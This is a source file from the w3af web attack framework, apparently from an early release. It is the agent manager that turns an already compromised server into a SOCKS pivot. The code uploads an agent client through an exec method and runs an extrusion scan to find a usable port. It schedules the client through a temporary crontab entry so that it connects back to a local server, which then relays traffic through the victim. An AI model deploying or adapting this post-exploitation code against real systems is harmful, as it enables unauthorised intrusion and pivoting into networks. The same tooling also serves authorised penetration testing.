'''
w3afAgentManager.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

import core.controllers.outputManager as om
from core.controllers.threads.w3afThread import w3afThread
from core.controllers.w3afException import w3afException
from core.controllers.w3afAgent.server.w3afAgentServer import w3afAgentServer
from core.controllers.payloadTransfer.payloadTransferFactory import payloadTransferFactory
from core.controllers.extrusionScanning.extrusionScanner import extrusionScanner
from core.controllers.intrusionTools.delayedExecutionFactory import delayedExecutionFactory
from core.controllers.intrusionTools.execMethodHelpers import *
import core.data.kb.config as cf
import os
import time


class w3afAgentManager( w3afThread ):
    '''
    Start a w3afAgent, to do this, I must transfer the agent client to the
    remote end and start the w3afServer in this local machine
    all this work is done by the w3afAgentManager, I just need to called
    start and thats it.
    '''
    def __init__( self, execMethod, socksPort=1080 ):
        w3afThread.__init__(self)
        
        self._execMethod = execMethod
        self._socksPort = socksPort
    
    def _exec( self, command ):
        '''
        A wrapper for executing commands
        '''
        om.out.debug('Executing: ' + command )
        response = apply( self._execMethod, ( command ,))
        om.out.debug('"' + command + '" returned: ' + response )
        return response
        
    def run( self ):
        
        om.out.information('Initializing w3afAgent system, please wait.')

        # First, I have to check if I have a good w3afAgentClient to send to the
        # other end...
        try:
            interpreter, clientCode, extension = self._selectClient()
        except w3afException, w3:
            om.out.error('Failed to find a suitable w3afAgentClient for the remote server.')
        else:
            
            # Get a port to use !
            inboundPort = self._getInboundPort()

            # Get the fastest transfer method
            ptf = payloadTransferFactory( self._execMethod )
            transferHandler = ptf.getTransferHandler( inboundPort )

            if not transferHandler.canTransfer():
                raise w3afException('Can\'t transfer shellcode to remote host, canTransfer() returned False.')
            else:
                om.out.debug('The echoTransfer can transfer files to the remote end.')
                # Let the user know how much time it will take to transfer the file
                estimatedTime = transferHandler.estimateTransferTime( len(clientCode) )
                om.out.debug('The payload transfer will take "' + str(estimatedTime) + '" seconds.')
                
                filename = getRemoteTempFile( self._execMethod )
                filename += '.' + extension
                om.out.information('Starting w3afAgentClient upload.')
                om.out.debug('Starting w3afAgentClient upload, remote filename is: "' + filename + '".')
                transferHandler.transfer( clientCode, filename )
                om.out.information('Finished w3afAgentClient upload.')
                
                # Start the w3afAgentServer
                agent_server = w3afAgentServer( socksPort=self._socksPort, listenPort=inboundPort )
                agent_server.start2()
                # Wait for it to start.
                time.sleep(0.5)
                
                if not agent_server.isRunning():
                    om.out.error( agent_server.getError() )
                else:
                    # And now start the w3afAgentClient on the remote server using cron / at
                    self._delayedExecution( interpreter + ' ' + filename + ' ' + cf.cf.getData( 'localAddress' ) + ' ' + str( inboundPort ) )
                
                    if not agent_server.isWorking():
                        om.out.error('Something went wrong, the w3afAgent client failed to connect back.')
                    else:
                        om.out.information('You may start using the w3afAgent that is listening on port '+ str(self._socksPort) +'. All connections made through this SOCKS daemon will be relayed using the compromised server.')
                        
    
    def _delayedExecution( self, command ):
        dexecf = delayedExecutionFactory( self._execMethod )
        dH = dexecf.getDelayedExecutionHandler()

        if not dH.canDelay():
            msg = '[w3afAgentManager] Failed to create cron entry.'
            om.out.debug( msg )
            raise w3afException( msg )
        else:
            waitTime = dH.addToSchedule( command )

            om.out.debug('[w3afAgentManager] Crontab entry successfully added.')
            waitTime += 2
            om.out.information('Please wait '+ str(waitTime) +' seconds for w3afAgentClient execution.')
            time.sleep( waitTime )
            
            om.out.debug('[w3afAgentManager] Restoring old crontab.')
            dH.restoreOldSchedule()
    
    def _selectClient( self ):
        '''
        This method selects the w3afAgent client to use based on the remote OS and some other factors
        like having a working python installation.
        '''
        # TODO: Implement this!
        python = self._exec('which python')
        if python.startswith('/'):
            fileContent = file( 'core' + os.path.sep + 'controllers' + os.path.sep + 'w3afAgent' + os.path.sep +\
            'client' + os.path.sep + 'w3afAgentClient.py' ).read()
            extension = 'py'
            interpreter = python
        else:
            # TODO: Implement this!
            interpreter = ''
            extension = 'py'
            interpreter = '/usr/bin/python'
            
        return interpreter, fileContent, extension

    def _getInboundPort( self ):
        # Do an extrusion scan and return the inbound open ports
        es = extrusionScanner( self._execMethod )
        try:
            inboundPort = es.getInboundPort()
        except Exception, e:
            om.out.error( 'The extrusion scan failed.' )
            om.out.error( 'Error: ' + str(e) )
            for p in [ 8080, 5060, 3306, 1434, 1433, 443, 80, 25, 22]:
                if es.isAvailable( p, 'TCP' ):
                    om.out.information('Using inbound port "'+ str(p) +'" without knowing if the remote host will be able to connect back.')
                    return p
            raise e
        else:
            return inboundPort
